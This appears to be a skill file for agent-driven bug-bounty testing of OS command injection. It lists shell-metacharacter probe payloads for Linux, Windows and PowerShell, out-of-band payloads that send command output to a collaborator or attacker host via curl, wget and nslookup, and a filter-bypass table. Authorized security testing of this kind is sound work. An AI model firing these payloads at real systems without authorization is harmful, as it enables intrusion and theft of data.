---
name: hunt-cmdi
description: OS command injection — bash/cmd/PowerShell metacharacters, blind, OOB DNS.
keywords: [command injection, os command injection, shell injection, bash, cmd, powershell, oob]
---

# hunt-cmdi

## Triggers

"command injection", "shell injection", "exec()", "system()", "Runtime.exec".

## Phase 1 — probe

Where: ping endpoints, dns lookup forms, image conversion args,
backup-script "filename" params, log analyzers, "test connection"
diagnostics.

Probes by platform:

Linux:
```
; id ;
| id
& id
$(id)
`id`
%0a id
{id,}            (Bash brace; works without spaces)
```

Windows:
```
& whoami
| whoami
& whoami &
% USERNAME %    (env reflection)
```

PowerShell:
```
;Get-Process    (only if app explicitly invokes PowerShell)
```

## Phase 2 — blind / OOB

When output is hidden:

```
; curl http://<collab>.oast.fun/$(id|base64) ;
| ping -c1 <attacker-ip>
`nslookup <collab>.oast.fun`
```

DNS works even when HTTP egress is blocked (firewall often permits
recursive DNS).

## Phase 3 — bypass matrix

| Filter | Bypass |
|---|---|
| Strips `;`, `&`, `|` | Use `\n` (`%0a`), `$(...)`, backticks |
| Strips spaces | `${IFS}` in Bash, `tab` (%09), `,` in `{cmd,arg}` brace |
| Allowlists hostnames | `target.com|id`, `target.com$(id)` |
| Length-limited | `t=$(id)`, `wget $attacker/$t` |

## Phase 4 — concrete impact

Always demonstrate:

- `id` / `whoami` output (Q1 evidence)
- Read a file that has actual sensitive content (Q6 concrete impact)

Do **not** drop a shell unless the engagement is red-team with
explicit RoE.

## Disclosed-report patterns

| Source | Pattern |
|---|---|
| CVE-2014-6271 (Shellshock) | env var → bash | (history)
| CVE-2017-5638 (Struts2) | OGNL → command exec |
| CVE-2024-3400 (PAN-OS GlobalProtect) | Pre-auth cmd injection |
| CVE-2023-2868 (Barracuda ESG) | Cmd injection in attachment |
| CVE-2024-23897 (Jenkins) | CLI arg expansion |

## Never-submit fallbacks

- "Output contains shell-metachar errors" without successful exec
  → CHAIN REQUIRED
- Argument injection where the arg can't reach `-c` / spawn flags
  → DOWNGRADE

## See also

- `hunt-rce` parent
- `hunt-ssti`
